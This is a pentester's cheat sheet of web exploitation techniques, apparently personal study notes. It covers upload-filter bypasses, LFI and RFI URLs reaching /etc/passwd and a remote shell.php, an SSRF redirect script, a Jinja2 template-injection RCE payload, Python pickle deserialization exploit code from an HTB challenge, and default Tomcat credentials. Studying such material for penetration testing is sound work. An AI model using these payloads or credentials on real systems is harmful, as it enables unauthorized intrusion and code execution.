# Web vulnerabilities
Methods and commands to exploit vulnerabilities after recon


# File upload
## Normal file upload vulnerability
*Magic Bytes*
```
BMP :    42 4D
JPG :    FF D8 FF E0
PNG :    89 50 4E 47
GIF :    47 49 46 38
```
### Checklist
- `hexeditor -b shell.php` (for full explanation refer to this article [https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/](https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/))
- Try double extensions (.php.jpg)
- Follow [this]([https://www.onsecurity.io/blog/file-upload-checklist/) article and try any other methods that I have not mentioned    
[(https://www.onsecurity.io/blog/file-upload-checklist/)](https://www.onsecurity.io/blog/file-upload-checklist/)


## Exiftool
If one discovered that the server is using exiftool to process the image uploaded one can try to exploit the tool with the following methods:
- CVE-2021-22204
- SVG to XSS (https://brutelogic.com.br/blog/file-upload-xss/)


## Pillow PY
- Check if the script that validates the image files is vulnerable to CVE-2018-16509
- Craft malicious image files


# File inclusion
## LFI
If a local file is queried via a URL parameter, an attacker might be able to query local files that weren't intended to be seen.
### Example usage and occurrence
`http://site.com?module=login.php`    
A bad actor could exploit this and make the following URL:    
`http://site.com?module=/etc/passwd`    


## RFI
This would happen when a web app allows users to include remote files in the URL.
### Example usage and occurrence
`http://site.com?file=http://127.0.0.1/file`    
A bad actor could exploit this and make the following URL:    
`http://site.com?file=http://127.0.0.1/shell.php`    
This would allow an attacker to get a malicious file on the webserver.
### Errors
If there are any error whilst trying the methods described above, one might try to url encode the whole url either once or numerous times.    
That is because some rules are configured so that they wouldn't look for url encoded strings.
#### Example
`../login.php` would become `..%252Flogin.php`

### Other help
[https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)


# SSRF
Server Side Request Forgery
This would occur on a web page that allows for redirects. One could change the header with a proxy to their own server and upload / use their malicious file(s) on the victim's machine.
## Procedure
Make a script to redirect somewhere of your choice

```php
<?php
header("Location: http://site.com")
?>
```
Start up a local server `php -S <ip>:<port>`    
Query the script file from the victim site


# Redis - Lua sandbox escape vulnerability (CVE-2022-0543)
**CVE-2022-0543** - Eval command in Redis allows for RCE, hence being able to read files owned by others.
## References
- [https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/#](https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/#)



# Flask
## (Jinja 2) RCE
Server side template injection RCE
```python
{{request.application.globals.builtins.import('os').popen('id').read()}}
```

## Insecure deserialization (Python pickle)
Pickle data unserialization allows for RCE

### Normal exploit
**Note:**  If the encoded cookie doesn't look the same as expected one can edit the *protocol* argument on the `pickle.dumps()` function.
```py
import pickle,os

class Pickle(object):
    def __reduce__(self):
        return os.system, ('id',)

o = Pickle()
print(pickle.dumps(o))
```

### Exploit for HTB challenge (baby website rick)
A cookie from the website can be decoded in *base64* so, that one can see what variables it uses.      
Also, the cookie wasn't edited properly when the script was ran with *python3* so, I decided to run it with *python2*
```py
from base64 import b64encode
import pickle,subprocess

class anti_pickle_serum(object):
    def __reduce__(self):
        return subprocess.check_output, (["ls"],)

dumps = pickle.dumps({"serum": anti_pickle_serum()},protocol=0)
print(b64encode(dumps))
```

#### References
- [https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
- [https://knowledge-base.secureflag.com/vulnerabilities/unsafe_deserialization/unsafe_deserialization_python.html](https://knowledge-base.secureflag.com/vulnerabilities/unsafe_deserialization/unsafe_deserialization_python.html)
- [https://ir0nstone.gitbook.io/hackthebox/challenges/web/baby-website-rick](https://ir0nstone.gitbook.io/hackthebox/challenges/web/baby-website-rick)


# Tomcat
Help from: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
## Default credentials
```
admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

## War file exploit (RCE)
If one has access to the Application Manager of Tomcat, the attacker can upload and run a .war file to execute code and get a shell potentially.     
**This is only possible if the account that the attacker is logged in with has enough privileges (admin,manager-script,manager)**

### References
- [https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/)

# ESIGate (ESI Injection)
Any ESIGate software is affected that has a lower version than *5.3*

## References
These are blog posts that consist of 2 parts
- [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
- [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)